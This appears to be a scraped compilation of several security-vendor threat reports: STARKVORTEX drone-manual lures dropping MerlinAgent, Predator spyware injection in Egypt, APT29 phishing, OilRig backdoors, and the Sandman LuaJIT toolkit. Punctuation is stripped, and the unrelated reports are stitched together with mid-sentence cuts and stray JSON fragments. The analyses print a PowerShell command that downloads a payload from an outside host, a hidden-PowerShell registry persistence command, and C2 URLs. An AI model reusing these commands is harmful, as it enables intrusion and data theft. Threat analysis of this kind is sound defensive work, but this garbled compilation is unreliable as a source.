        "text": "By Securonix Threat Research DIuzvyk TPeck OKolesnikovSept 25 2023 updated Sept 27 2023 updated Oct 6 2023As the war between Russia and Ukraine rages the cyber warfare landscape between the two countries also continues to show no signs of slowing down New tactics and malware variants continue to emerge as were entering the year and a half mark of the conflictOur team has identified an interesting campaign tracked by Securonix as STARKVORTEX which is actively targeting Ukraines military Since drones or unmanned aerial vehicles UAVs have been an integral tool used by the Ukrainian military malware-laced lure files themed as UAVs service manuals have begun to surfaceObfuscated PowerShell code is then executed from the JavaScript code within the chm file which was used to contact a remote C2 server to download an obfuscated binary payloadThe payload is an obfuscated binary that gets XORd and decoded to produce a beacon payload for MerlinAgent malware Once the payload establishes communication back to its C2 server the attackers would have full control over the victim hostWhile the attack chain is quite simple the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection Well go over each stage in detail further downThe malicious chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine Microsoft help files have been used maliciously in the past though today they are less common as Microsoft stopped supporting the chm file format in 2007 They can however be opened and executed in modern Windows versionsHelp files such as the lure document used in the STARKVORTEX campaign would be executed using the Windows binary hhexe which is launched automatically when a user runs the chm fileAs you can see from the figure below the help file would have no trouble evading antivirus and EDR detections as it scored 059 detections in VirusTotalFigure 1 VirusTotal detections for v22chmAs we mentioned previously the lure document was themed as a drone or UAV manual Examining its contents we see instructions written in the Ukrainian language for a DJI Mavic 3 droneFigure 2 lure document contents for v22chmSince Microsoft help files are essentially container files they can be opened and analyzed using file archival software such as 7zip With the case of v22chm were able to observe several HTML files contained withinFigure 3 Contents of v22chmAfter examining the contents of page1html we found a huge JavaScript one liner embedded into the HTML within scriptscript tags Its contents were heavily obfuscated however we observed it executing another obfuscated PowerShell script which well dive into nextFigure 4 Example of obfuscated JavaScript code found within page1htmlFigure 5 Stage 1 obfuscated PowerShell executed by v22chmAfter deobfuscating the Base64 encoded blob we find more obfuscated PowerShell code This time some key information such as C2 URL and payload names become visible This is seen in the figure belowNext well clean this code up and go over it in detail to gain a better understanding of its purposeFigure 6 Stage 2 obfuscated PowerShell executed by v22chmWith the PowerShell code a bit more human-readable its pretty clear as to what its doing In general the script downloads a payload from hxxpsfilescatboxmoeg1h7zrbin decodes and decrypts it and saves it to the local Appdata folder to SysctlHostctlhostexeFigure 7 Deobfuscated PowerShell analysis file download directory setupThis first bit of the script establishes a few variables such as the C2 URL plUrl binary path plPathSuffix decryption key cryptPS and the XOR mask size value xorMaskSize The bulk of the code is stored inside the doS function which is called at the end of the scriptNext the script performs key functionsThe script then downloads the file from the C2 server The command as you can see is heavily obfuscated however deobfuscating the PowerShell code produces the following download commandSystemNetWebClientnewDownloadFilehxxpsfilescatboxmoeg1h7zrbin The command is then executed using an invoke expression IEXFurther down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 belowFigure 8 Deobfuscated PowerShell binary file decodingIn a nutshell the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7Compute the hash and fill the XOR mask File transformation using the XOR maskNote The outer whilefalse is odd since it renders the entire subsequent code block ineffective It could be a mistake by the attackers or it could act as a placeholder for other binary files that would require its specific functionalityWith the file decoded into a variable the next portion of the script then saves it over the original file after leveraging and then deleting a temporary fileFigure 9 Stage 3 deobfuscated PowerShellThe last bit of code takes a previously downloaded encrypted and compressed file with a tmp extension decompresses its content writes the decompressed content back to the original file deletes the tmp file The last portion of the script then executes the original file in a few different waysThe PowerShell script appears to be written with several options and configurations in mind hence the false while statement we mentioned earlier Also the existence of optional binary file arguments which were set to null in this caseThe Windows binary file downloaded is a 64-bit executable at about 5MB in size Some additional binary information is highlighted in figure 10 belowFigure 10 ctlhostexe binary file overviewUpon closer examination it appears to be a generated binary executable by the MerlinAgent framework Similar to Cobalt Strike and Silver MerlinAgent is an open source command and control framework available on GithubThe MerlinAgent framework is an open source C2 framework written in Go It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads Attackers can then distribute these payloads and incorporate them into their own malware stager or loader MerlinAgent has a wide range of capabilities which includeThe agent itself supports a wide range of command flags in which blue team defenders can be on the lookout forUpon execution the MerlinAgent payload will immediately begin beaconing to listenservemp3com It also establishes persistence in the registry by creating a new key called ctlhost located in HKEYUSERSSoftwareMicrosoftWindowsCurrentVersionRun with the contents cmdexe c start min windirsystem32WindowsPowerShellv10powershellexe -command Start-Process -filepath CUsersREDACTEDAppdataRoamingsysctlHostctlhostexe -WindowStyle Hidden This will execute the binary file every time the user logs into the systemOnce the process establishes a connection to the attackers C2 server the attacker will have full control over the systemIts apparent that this attack was highly targeted towards the Ukrainian military given the language of the document and its targeted natureFiles and documents used in the attack chain are very capable of bypassing defenses scoring 0 detections for the malicious chm file Typically receiving a Microsoft help file over the internet would be considered unusual However the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or fileDuring the STARKVORTEX campaign we observed the following network communication to C2 hosts Command and control from the MerlinAgent payload to the attackers C2 server used an encrypted channel over port 443

Offerschm follows the same malicious pattern originally observed with the STARKVORTEX campaignFigure 1 Confidential Offerschm lure documentThe help file contains a single html file which executes the malicious JavaScript payload The HTML file is titled which translates from Ukrainian to International partners When opened the content of the lure file simply contains a few company logosLike the original attack campaign the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-linerFigure 2 Obfuscated JavaScript sample executed by Confidential OfferschmThe PowerShell script downloads a binary MerlinAgent payload from hxxpsshorturlatabPU5 which redirects to hxxpsfilescatboxmoesbjchfmod The encoded payload is decoded and then executed in almost the same fashion as we saw beforeThe binary payload which gets downloaded and executed is named minecraftexe and is placed in the directory appdatalocalgamesminecraftexe and the C2 beaconing address is listenserveminecraftnet Why the attackers chose to masquerade as Minecraft is unclear other than the fact that it is a wildly popular game This does speculate that it was probably not intended for business systems where games would normally not be foundToday we wont go too deep into the rest of the attack chain as it is almost identical to what we first encountered

Telecom Egypt side or the Vodafone Egypt side of the link However we suspect that it is within Vodafone Egypts network because precisely targeting injection at an individual Vodafone subscriber would require integration with Vodafones subscriber databaseAlso given that the injection is operating inside Egypt the spyware is sold to government agencies and Egypt is a known Predator customer it is highly unlikely that this targeting occurred and that this setup was established outside of the purview of Egyptian authoritiesTypically localizing the injection would involve sending packets from the targeted device the client with increasing IP Time To Live TTL values Since each router that handles a packet subtracts one from the IP TTL value packets expire when TTL reaches zero and routers typically identify their IP addresses to the packets sender if they handle a senders expired packet we could locate the routers on either side of the injector The routers on either side of the injector would be 1 the router which reports an expired packet containing the highest TTL value for which the injector does not respond and 2 the router which reports an expired packet containing the lowest TTL value for which the injector does respond We could then identify which network the IP addresses belong to by looking them up in an IP WHOIS databaseHowever this technique was not applicable to Eltantawys case because Vodafone Egypts network appears to have a separate middlebox close to subscribers that manages all TCP connections This middlebox which we suspect is used for benign traffic management is located at approximately IP TTL 4 from Eltantawy Since the traffic management middlebox rewrites packets with fixed TTL values we cannot control the TTL value beyond the traffic management middlebox We were however able to determine that the spyware injection was not located anywhere up to TTL 4 from EltantawyWe identified two design choices in the injector which together enabled us to localize the injection in reverse from a measurement server we controlled First the injector attempts to mask its presence by copying IP TTL values it receives into packets it injects Second when injecting a response to a client from a server the injector takes the servers TTL to be the TTL from the first SYNACK it sees for a TCP connection while ignoring TTL values in subsequent SYNACKsTogether these two design choices allow us to use our measurement server to prime the injector to inject a TTL 1 packet to the clientTo do this our measurement server responds to a SYN by sending a SYNACK that reaches the injector with TTL 1 and then sending a follow-up SYNACK with somewhat higher TTL such that it reaches the traffic management middlebox completes the connection and causes the traffic management middlebox to send the HTTP GET request that triggers the injectionWhen the HTTP GET request reaches the injector the injector sends a packet back to the client with TTL 1 Because the injector is not directly adjacent to the client the router immediately downstream from the injector will determine the packet is expired and notify the sender of the injected packet Because the injector spoofs the packet to come from our measurement server the router identifies itself to us notifying our measurement server of the packets expiry This process is illustrated in Figure 2We attribute the spyware injection in Egypt to Sandvines PacketLogic product with high confidence Our attribution below has three partsCharacterizing the spyware injection in Egypt was challenging because of the presence of the Traffic Management Middlebox on Vodafone Egypts network This prevented us from seeing the raw packets sent by the spyware injector to Eltantawys deviceNevertheless we were able to characterize the spyware injection in Egypt as followsWe conducted another measurement in September 2023 and found that the injection no longer matched our 2018 Sandvine PacketLogic fingerprint exactly but was entirely consistent with the Egypt malware injectionAs of September 2023 the Turk Telekom injector still matches an odd bug we observed with their Sandvine PacketLogic deployment in December 2020 which leads us to conclude that Turk Telekom is still using Sandvine PacketLogic Specifically Turk Telekoms injector returns an injected unencrypted HTTP 307 Temporary Redirect message in response to a TLS Client Hello which is an odd protocol violationBecause the Turk Telecom injector still shows highly compelling similarities to its past behavior when we attributed it to Sandvine PacketLogic and because the Turk Telecom injectors current behavior is fully consistent with the behavior of the Egypt spyware injector we attribute the Egypt spyware injector to Sandvine PacketLogic with high confidenceEltantawy additionally received several SMS messages in September 2021 May 2023 and September 2023 that posed as messages originating from WhatsAppThe fraudulent messages invited Eltantawy to visit an included link to terminate what the messages said was a new login to Eltantawys WhatsApp account In reality clicking the links would likely have infected Eltantawys phone with Cytroxs Predator spywareInterestingly the domain names in the links do not match our F1 or F2 Predator fingerprint However approximately 2 minutes and 30 seconds after Eltantawy read the 15 September 2021 message the Predator spyware was installed on his phone We suspect that he clicked the messages link triggering the installation Since the 2023 messages contain similar bait content we believe these messages were also attempts to install the Predator spyware on his phoneWe believe these websites are custom websites perhaps registered by a specific Predator customer We believe that the following domain names are relatedWe translate the messages in Figure 4 belowThis is Angie Raouf from FIDH organization for human rightsI was doing a case study on the elections in the middle east and I wanted to ask you about LINK and whether there is harassment from the government towards the candidate Ahmed TantawiThank you very muchIf you allow me I would like to get the opinion of those opposed to the Egyptian regime as their point of viewAt the beginning I would like to start with an article written by Wael Qandeel and what do you think of it LINK How do you think elections should be done so it wont become a comic playI wanted elections even if it wasnt fair or just but sadly I cant even see it as electionsI know that you are very busy but I would be grateful if you could help me in my researchThe use of mercenary spyware to target a senior member of a countrys democratic opposition after they had announced their intention to run for president is a clear interference in free and fair elections and violates the rights to freedom of expression assembly and privacy It also directly contradicts how mercenary spyware firms publicly justify their salesPresident el-Sisi has been widely condemned for his autocratic rule and Egypts human rights abuses have been extensively documented For any responsible company whose technology could be abused the warning signs are clear Yet as evident in our report insufficient due diligence was done to prevent these types of abuses by Cytrox or the other firms we have identified whose technology was employed to target and hack the device of EltantawyOur report also reveals the potential insecurities that run through the entire spectrum of the telecommunications ecosystem including at the network layer which can be exploited to inject malware on an unsuspecting users device Our internet communications are routed through many networks and middleboxes some of which can be mis-used for malicious purposes particularly if network requests flowing through them are not protected with cryptography Although great strides have been made in recent years to encrypt the web users still occasionally visit websites without HTTPS and a single non-HTTPS website visit can result in spyware infection This report should serve as a reminder of the importance of achieving a 100 rate of HTTPS adoptionWe urge everyone to immediately update their devicesPatched versions are macOS Ventura 136 macOS Monterey 127 watchOS 963 watchOS 1001 iOS 167 and iPadOS 167 iOS 1701 and iPadOS 1701These two recent high profile cases underline the serious value that this security mode providesSpecial thanks to Ahmed Eltantawy who chose to assist us in investigating his case We would like to acknowledge his bravery in coming forward publicly Without his collaboration the discovery of these CVEs would not have been possibleSpecial thanks to Jakub Dalek Jeff Knockel and Adam Senft for assistance and reviewThanks to the entire team at Google TAG especially Maddie Stone for their collaboration in this investigationThanks to multiple teams at Apple for their rapid response and patch cycleWed also

us and our mission to help organizations defend against cyber crimeDuring the lead up to Ukraine's counteroffensive Mandiant and Googles Threat Analysis Group TAG have tracked an increase in the frequency and scope of APT29 phishing operations Investigations into the groups recent activity have identified an intensification of operations centered on foreign embassies in Ukraine Notably as part of this activity we have seen phishing emails targeting a wide range of diplomatic representations in Kyiv including those of Moscows partners representing the first time we have observed this cluster of APT29 activity pursuing governments strategically aligned with Russia Based on the timing and focus of APT29s Ukraine-focused operations we judge they are intended to aid Russias Foreign Intelligence Service SVR in intelligence collection concerning the current pivotal phase of the warAPT29s increased phishing activity in Ukraine has occurred alongside an uptick in the groups more routine espionage operations against global diplomatic entities Across these malware delivery operations APT29 continues to prioritise European Ministries of Foreign Affairs and embassies but it has also sustained operations that are global in scope and illustrative of Russias far-reaching ambitions and interests in other regions The current secondary focus is concentrated in Asia with governments in Trkiye formerly known as Turkey India and other regions of vital strategic importance to Moscow such as Africa factoring into its 2023 priorities We judge that Russias war in Ukraine has almost certainly shaped APT29s espionage priorities but it has not supplanted themAlongside the increased pace of operations and changes in targeting we have also seen a major shift in the groups tooling and tradecraft APT29 has rebuilt several of its tools and has made repeated iterative modifications to its existing malware delivery chain likely to ensure its operational longevity despite long-term persistent use We assess that several of these changes are highly likely specifically designed to sidestep research methods and tools commonly used by the threat intelligence community to track their operations indicating that operational security priorities continue to factor heavily into APT29s tooling decisionsROOTSAWs central and continued role in APT29 operations has spurred changes to the malware delivery chain over time The most visible change has been the move away from HTML attachments as the initial infection vector with APT29 shifting to hosting its first-stage payloads on compromised web services such as WordPress sites Migrating the first-stage payload server side has likely provided APT29 a greater degree of control over its malware delivery chain and allowed the group to be more judicious about the exposure of its later-stage capabilities For example to prevent detection of malware in environments not intended for compromise APT29 has implemented various forms of filtering in its first-stage payloads and has removed staged malware from compromised servers shortly after operational use Notably these efforts have also prevented payloads being acquired by public malware repositories and other common security research tools helping to avoid detection and extend the operational lifespan of its newer malware variants In March 2023 Mandiant identified a new APT29 phishing campaign targeting Trkiye The phishing waves impersonated the Turkish Deputy Minister of Foreign Affairs and included a phishing link accompanied by content related to the February 2023 earthquake that struck southern TrkiyeIn both waves APT29 incorporated a new version of ROOTSAW with added user-agent based anti-analysis guardrails This variant checks the user-agent of the device looking for Windows operating systems that do not contain NET and contain the value Windows NT As a result if the victim is running a non-Windows based operating system or the request is made through NET the server will deliver a decoy PDF file In the second wave this PDF file was identical to the version contained in the malicious ZIP payload This filtering tactic is likely used to identify automated downloaders and non-compatible victim devices further reducing the odds of exposing malware in non-compromise contexts Each payload within the new ROOTSAW variant is obfuscated using a unique key although the deobfuscation routine remains the sameIn an additional phishing campaign in March 2023 APT29 targeted various diplomatic missions in Europe Notably in the two weeks that lapsed between the Turkey campaign further changes were identified resulting in two new variants of ROOTSAW that shifted the newly added anti-analysis guardrails server sideIn April 2023 APT29 continued to modify its standard malware delivery chain introducing a new technique for malware delivery In this operation APT29 re-used one its frequent diplomatic event-themed lure documents spoofing the Czechia Embassy more commonly known as the Czech Republic that invited targets to a wine tasting event on April 13 2023 The document contained a link to the phishing website httpssylviocombrformphp which delivered either an ISO or a ZIP archive to the victimIn May in the lead up to Ukraines counteroffensive APT29 conducted two distinct phishing waves targeting a wide range of diplomatic representations in Kyiv including those of Moscows partners Each campaign adopted separate intrusion chains similar to those seen in March and April 2023In late June Mandiant identified an additional APT29 phishing campaign with a new variant of ROOTSAW to target a European government Phishing emails were sent from a compromised North American government email address and crafted to appear as an invitation to a public holiday celebration from Norwegian embassy personnel Two different delivery mechanisms were used in this campaign a PDF MD5 b4141aa8d234137f0b9549a448158a95 containing a link to an actor-hosted ROOTSAW variant and emails with an attached Scalable Vector Graphic SVG file MD5 295527e2e38da97167979ade004de880 rather than the typical HTML payloadIn July APT29 continued to experiment with new ROOTSAW delivery mechanisms and victim filtering capabilities in an operation deploying a new downloader ICEBEAT to target European diplomatic entities Emails were sent purporting to be an invite from a non-specified German embassy for an Ambassadors farewell reception Of note ICEBEATs use of the open source Zulip messaging platform for command and control C2 follows a pattern of past APT29 downloaders using legitimate services for command and control including Dropbox Firebase OneDrive and TrelloBeyond the continued adaptation of APT29s malware delivery chain Mandiant has also observed dedicated efforts to update and evolve the groups later-stage malware into multiple variations increasing the quantity and quality of tooling used across its campaigns At least six distinct downloaders have been identified during the first half of 2023As noted in the June 2023 campaign we have also witnessed APT29 operating various infection chains simultaneously within a single campaign suggesting that distinct initial access operators or subteams may be operating in parallel to service different regional targets or espionage objectives Although we have been unable to ascertain the specific logic behind decisions about which malware delivery approach to use or when to introduce new later-stage malware variants we judge with low confidence that they are likely driven by mission-specific parameters such as targets or operational objectivesThe increased scope and frequency of APT29's diplomatic-focused spear phishing campaigns in the first half of 2023 has compelled the initial access team to make repeated modifications to its long-standing malware delivery chain Efforts to move capabilities server side introduce anti-analysis components and deliver decoy documents in non-compromise contexts have likely helped the group extend the shelf-life of its ROOTSAW-centred concept of operations Even with this unprecedented pace of change the group has remained highly operational security conscious and has taken repeated steps to circumvent the methods that security researchers use to track and respond to its activityAPT29's increased operational tempo has also exposed patterns of operations that likely reflect different initial access operators or subteams supported by a centralized development team More generally these patterns likely reflect a growing mission and pool of resources dedicated to collecting political intelligence and that group will almost certainly continue to pose a high severity threat to governments and diplomatic entities globallyATTCK Tactic CategoryTechniquesResource DevelopmentInitial AccessExecutionPersistencePrivilege EscalationDefence

OilRigs Outer Space and Juicy Mix campaigns targeting Israeli organizations in 2021 and 202221 Sep 2023 22 min readESET researchers have analyzed two campaigns by the OilRig APT group Outer Space 2021 and Juicy Mix 2022 Both of these cyberespionage campaigns targeted Israeli organizations exclusively which is in line with the groups focus on the Middle East and used the same playbook OilRig first compromised a legitimate website to use as a CC server and then used VBS droppers to deliver a CNET backdoor to its victims while also deploying a variety of post-compromise tools mostly used for data exfiltration on the target systemsIn their Outer Space campaign OilRig used a simple previously undocumented CNET backdoor we named Solar along with a new downloader SampleCheck5000 or SC5k that uses the Microsoft Office Exchange Web Services API for CC communication For the Juicy Mix campaign the threat actors improved on Solar to create the Mango backdoor which possesses additional capabilities and obfuscation methods In addition to detecting the malicious toolset we also notified the Israeli CERT about the compromised websitesKey points of this blogpostIn this blogpost we provide technical analysis of the Solar and Mango backdoors of the VBS dropper used to deliver Mango and of the post-compromise tools deployed in each campaignBesides the overlap in tools and targeting we also saw multiple similarities between the Solar backdoor and the backdoors used in Out to Sea mostly related to upload and download both Solar and Shark another OilRig backdoor use URIs with simple upload and download schemes to communicate with the CC server with a d for download and a u for upload additionally the downloader SC5k uses uploads and downloads subdirectories just like other OilRig backdoors namely ALMA Shark DanBot and Milan These findings serve as a further confirmation that the culprit behind Outer Space is indeed OilRigAs for the Juicy Mix campaigns ties to OilRig besides targeting Israeli organizations which is typical for this espionage group there are code similarities between Mango the backdoor used in this campaign and Solar Moreover both backdoors were deployed by VBS droppers with the same string obfuscation technique The choice of post-compromise tools employed in Juicy Mix also mirrors previous OilRig campaignsNamed for the use of an astronomy-based naming scheme in its function names and tasks Outer Space is an OilRig campaign from 2021 In this campaign the group compromised an Israeli human resources site and subsequently used it as a CC server for its previously undocumented CNET backdoor Solar Solar is a simple backdoor with basic functionality such as reading and writing from disk and gathering informationThrough Solar the group then deployed a new downloader SC5k which uses the Office Exchange Web Services API to download additional tools for execution as shown in Figure 1 In order to exfiltrate browser data from the victims system OilRig used a Chrome-data dumper called MKGIn 2022 OilRig launched another campaign targeting Israeli organizations this time with an updated toolset We named the campaign Juicy Mix for the use of a new OilRig backdoor Mango based on its internal assembly name and its filename Mangoexe In this campaign the threat actors compromised a legitimate Israeli job portal website for use in CC communications The groups malicious tools were then deployed against a healthcare organization also based in IsraelThe Mango first-stage backdoor is a successor to Solar also written in CNET with notable changes that include exfiltration capabilities use of native APIs and added detection evasion codeAlong with Mango we also detected two previously undocumented browser-data dumpers used to steal cookies browsing history and credentials from the Chrome and Edge browsers and a Windows Credential Manager stealer all of which we attribute to OilRig These tools were all used against the same target as Mango as well as at other compromised Israeli organizations throughout 2021 and 2022 Figure 2 shows an overview of how the various components were used in the Juicy Mix campaignIn this section we provide a technical analysis of the Solar and Mango backdoors and the SC5k downloader as well as other tools that were deployed to the targeted systems in these campaignsTo establish a foothold on the targets system Visual Basic Script VBS droppers were used in both campaigns which were very likely spread by spearphishing emails Our analysis below focuses on the VBS script used to drop Mango SHA-1 3699B67BF4E381847BF98528F8CE2B966231F01A note that Solars dropper is very similarThe droppers purpose is to deliver the embedded Mango backdoor schedule a task for persistence and register the compromise with the CC server The embedded backdoor is stored as a series of base64 substrings which are concatenated and base64 decoded As shown in Figure 3 the script also uses a simple string deobfuscation technique where strings are assembled using arithmetic operations and the Chr functionOn top of that Mangos VBS dropper adds another type of string obfuscation and code to set up persistence and register with the CC server As shown in Figure 4 to deobfuscate some strings the script replaces any characters in the set - with 0 then divides the string into three-digit numbers that are then converted into ASCII characters using the Chr function For example the string 116110101109117991116877796846-5010810912011577 translates to Msxml2DOMDocumentOnce the backdoor is embedded on the system the dropper moves on to create a scheduled task that executes Mango or Solar in the other version every 14 minutes Finally the script sends a base64-encoded name of the compromised computer via a POST request to register the backdoor with its CC serverSolar is the backdoor used in OilRigs Outer Space campaign Possessing basic functionalities this backdoor can be used to among other things download and execute files and automatically exfiltrate staged filesWe chose the name Solar based on the filename used by OilRig Solarexe It is a fitting name since the backdoor uses an astronomy naming scheme for its function names and tasks used throughout the binary Mercury Venus Mars Earth and JupiterSolar begins execution by performing the steps shown in Figure 5The backdoor creates two tasks Earth and Venus that run in memory There is no stop function for either of the two tasks so they will run indefinitely Earth is scheduled to run every 30 seconds and Venus is set to run every 40 secondsEarth is the primary task responsible for the bulk of Solars functions It communicates with the CC server using the function MercuryToSun which sends basic system and malware version information to the CC server and then handles the servers response Earth sends the following info to the CC serverEncryption and decryption are implemented in functions named JupiterE and JupiterD respectively Both of them call a function named JupiterX which implements an XOR loop as shown in Figure 6An Israeli human resources companys web server which OilRig compromised at some point before deploying Solar was used as the CC serverhttporganizationcoilprojecttemplatesofficetemplateaspxrtdsunencryptedMachineGuidrnencryptionnoncePrior to being appended to the URI the encryption nonce is encrypted and the value of the initial query string rt is set to d here likely for downloadThe last step of the MercuryToSun function is to process a response from the CC server It does so by retrieving a substring of the response which is found between the characters QQ and kk This response is a string of instructions separated by asterisks that is processed into an array Earth then carries out the backdoor commands which include downloading additional payloads from the server listing files on the victims system and running specific executablesCommand output is then gzip compressed using the function Neptune and encrypted with the same encryption key and a new nonce Then the results are uploaded to the CC server thushttporganizationcoilprojecttemplatesofficetemplateaspxrtusunMachineGuidrnnewnonceMachineGuid and the new nonce are encrypted with the JupiterE function and here the value of rt is set to u likely for uploadVenus the other scheduled task is used for automated data exfiltration This small task copies the content of files from a directory also named Venus to the CC server These files are likely dropped here by some other as yet unidentified OilRig tool After uploading a file the task deletes it from diskFor its Juicy Mix campaign OilRig switched from the Solar backdoor to Mango It has a similar workflow to Solar and overlapping capabilities but there are nevertheless several notable changesContrary to Solars astronomy-themed naming scheme Mango obfuscates its symbol names as can be seen in Figure 7 Besides the symbol name obfuscation Mango also uses the string stacking method as shown in Figure 8 to obfuscate strings which complicates the use of simple detection methods Similar to Solar the Mango backdoor starts by creating an in-memory task scheduled to run indefinitely every 32 seconds This task communicates with the CC server and executes backdoor commands similar to Solars Earth task While Solar also creates Venus a task for automated exfiltration this functionality has been replaced in Mango by a new backdoor commandIn the main task Mango first generates a victim identifier victimID to be used in CC communications The ID is computed as an MD5 hash of machine nameusername formatted as a hexadecimal stringTo request a backdoor command Mango then sends the string dvictimIDmachine nameusername to the CC server httpwwwdarushcoiladsasp a legitimate Israeli job portal likely compromised by OilRig before this campaign We notified the Israeli national CERT organization about the compromiseThe request body is constructed as followsTo communicate with its CC server Mango uses the TLS Transport Layer Security protocol which is used to provide an additional layer of encryptionSimilarly the backdoor command received from the CC server is XOR encrypted base64 encoded and then enclosed between and within the HTTP response body The command itself is either NCNT in which case no action is taken or a string of several parameters delimited by as detailed in Table 1 which lists Mangos backdoor commands Note that Arg0 is not listed in the table but is used

techniques goal is to block endpoint security solutions from loading their user-mode code hooks via a DLL in this process While the parameter was not used in the sample we analyzed it could be activated in future versionsUnrelated to the Juicy Mix campaign in July 2023 we found a new version of the Mango backdoor SHA-1 C9D18D01E1EC96BE952A9D7BD78F6BBB4DD2AA2A uploaded to VirusTotal by several users under the name Menorahexe The internal version in this sample was changed from 100 to 111 but the only notable change is the use of a different CC server httptecforsc-001-site1gtempurlcomadsaspAlong with this version we also discovered a Microsoft Word document SHA-1 3D71D782B95F13EE69E96BCF73EE279A00EAE5DB with a malicious macro that drops the backdoor Figure 10 shows the fake warning message enticing the user to enable macros for the document and the decoy content that is displayed afterwards while the malicious code is running in the backgroundFigure 10 Microsoft Word document with a malicious macro that drops Mango v111In this section we review a selection of post-compromise tools used in OilRigs Outer Space and Juicy Mix campaigns aimed at downloading and executing additional payloads and stealing data from the compromised systemsSampleCheck5000 or SC5k is a downloader used to download and execute additional OilRig tools notable for using the Microsoft Office Exchange Web Services API for CC communication the attackers create draft messages in this email account and hide the backdoor commands in there Subsequently the downloader logs into the same account and parses the drafts to retrieve commands and payloads to executeSC5k uses predefined values Microsoft Exchange URL email address and password to log into the remote Exchange server but it also supports the option to override these values using a configuration file in the current working directory named settingkey We chose the name SampleCheck5000 based on one of the email addresses that the tool used in the Outer Space campaignOnce SC5k logs into the remote Exchange server it retrieves all the emails in the Drafts directory sorts them by most recent keeping only the drafts that have attachments It then iterates over every draft message with an attachment looking for JSON attachments that contain data in the body It extracts the value from the key data in the JSON file base64 decodes and decrypts the value and calls cmdexe to execute the resulting command line string SC5k then saves the output of the cmdexe execution to a local variableAs the next step in the loop the downloader reports the results to the OilRig operators by creating a new email message on the Exchange server and saving it as a draft not sending as shown in Figure 11 A similar technique is used to exfiltrate files from a local staging folder As the last step in the loop SC5k also logs the command output in an encrypted and compressed format on diskIt is characteristic of OilRig operators to use browser-data dumpers in their post-compromise activities We discovered two new browser-data stealers among the post-compromise tools deployed in the Juicy Mix campaign alongside the Mango backdoor They dump the stolen browser data in the TEMP directory into files named Cupdate and Eupdate hence our names for them CDumper and EDumperBoth tools are CNET browser-data stealers collecting cookies browsing history and credentials from the Chrome CDumper and Edge EDumper browsers We focus our analysis on CDumper since both stealers are practically identical save for some constantsWhen executed CDumper creates a list of users with Google Chrome installed On execution the stealer connects to the Chrome SQLite Cookies History and Login Data databases under APPDATALocalGoogleChromeUser Data and collects browser data including visited URLs and saved logins using SQL queriesThe cookie values are then decrypted and all collected information is added to a log file named CUsersuserAppDataLocalTempCupdate in cleartext This functionality is implemented in CDumper functions named CookieGrab see Figure 12 HistoryGrab and PasswordGrab Note that there is no exfiltration mechanism implemented in CDumper but Mango can exfiltrate selected files via a backdoor commandBesides browser-data dumping tools OilRig also used a Windows Credential Manager stealer in the Juicy Mix campaign This tool steals credentials from Windows Credential Manager and similar to CDumper and EDumper stores them in the TEMP directory this time into a file named IUpdate hence the name IDumper Unlike CDumper and EDumper IDumper is implemented as a PowerShell scriptOilRig continues to innovate and create new implants with backdoor-like capabilities while finding new ways to execute commands on remote systems The group improved upon its CNET Solar backdoor from the Outer Space campaign to create a new backdoor named Mango for the Juicy Mix campaign The group deploys a set of custom post-compromise tools that are used to collect credentials cookies and browsing history from major browsers and from the Windows Credential Manager Despite these innovations OilRig also continues to rely on established ways to obtain user dataSHA-1FilenameESET detection

        "title": "Sandman APT A Mystery Group Targeting Telcos with a LuaJIT Toolkit - SentinelOne",
        "text": "By Aleksandar Milenkoski in collaboration with QGroupThe activities we observed are characterized by strategic lateral movement to specific targeted workstations and minimal engagement suggesting a deliberate approach aimed at achieving the set objectives while minimizing the risk of detectionThe implementation and architecture of LuaDream suggest a maintained versioned project under active development This is a modular multi-protocol backdoor whose main functionalities areAlthough the intrusions were detected and interrupted before the threat actor could deploy plugins our analysis of LuaDream staging samples shared on VirusTotal provided a glimpse into what functionalities the plugins may implement with command execution capabilities being one exampleThe 36 distinct LuaDream components we identified and the support for multiple protocols for C2 communication indicate a project of a considerable scale The LuaDream staging chain is designed to evade detection and thwart analysis while deploying the malware directly into memory LuaDreams implementation and staging process leverage the LuaJIT platform the just-in-time compiler for the Lua scripting language This is primarily to make malicious Lua script code difficult to detectBased on current visibility accurate clustering remains a challenge The focussed strategy-driven activities and the use of complex malware designed to evade detection point to a motivated and capable adversary The TTPs victimology and the characteristics of the deployed malware indicate that it is highly likely this activity has espionage motivations Communication providers are frequent targets of espionage activity due to the sensitive data they holdThe activity cluster we observed and examination of C2 netflow data indicate a pronounced focus on targeting telecommunications providers with a broad geographical distribution including the Middle East Western Europe and the South Asian subcontinentCompilation timestamps and a string artifact found within LuaDream hint at potential malware development efforts over the first half of 2022 suggesting possible threat actor activity dating back to 2022While we cannot associate LuaDream to any known threat actor we lean towards the possibility of a private contractor or mercenary group Typically used as a scripting middleware in gaming and specialty embedded applications and appliances the use of LuaJIT in the context of APT malware is relatively rare but the population using it is becoming broader Embedded Lua VMs serve as a mechanism for modularity and extensibility for advanced APTs historically considered Western or Western-aligned However this development paradigm is being embraced by a broader set of threat actors that also target Western countries and deserves further scrutiny as exemplified by the Sandman APT Our talk at LABScon 2023 described this paradigm of development overtime bookended by our discovery of Sandman APT as the latest along with Fast16 as the earliest example dating back to 2005In March 2023 new malware was briefly described by Kaspersky during a quarterly roundup actively targeting a government entity in Pakistan Based on the sparsely described characteristics we assess that theyre referring to a variant of LuaDream dubbed DreamLand Note the following string in the LuaDream samples we identifiedThe activities we observed took place over several weeks in August 2023 After stealing administrative credentials and conducting reconnaissance Sandman infiltrated specifically targeted workstations using the pass-the-hash technique over the NTLM authentication protocol On one of the targets all of the workstations were assigned to personnel in managerial positionsOn average we observed a five-day gap between infiltrations into different endpoints After gaining access Sandman limited its activities to deploying folders and files required for loading and executing LuaDream refraining from any further actions We observerd the following deployed filesystem artifactsIt is relevant to note that we did not observe the threat actor restarting the Fax and or Spooler service to force the execution of LuaDream likely to evade detection based on service manipulation Instead they were patient in waiting for one of these services to load the malicious ualapidll when started at the next system bootThe LuaDream staging process is intricate and designed with a focus on evading detection and thwarting analysis Initiated by the Fax or the Spooler service which would execute the UalStart export of the malicious ualapidll when started the overall process consists of seven main stages These are conducted fully in memory and involve a combination of fully-formed DLL PE images code and LuaJIT bytecodeThe following table shows DLL images involved 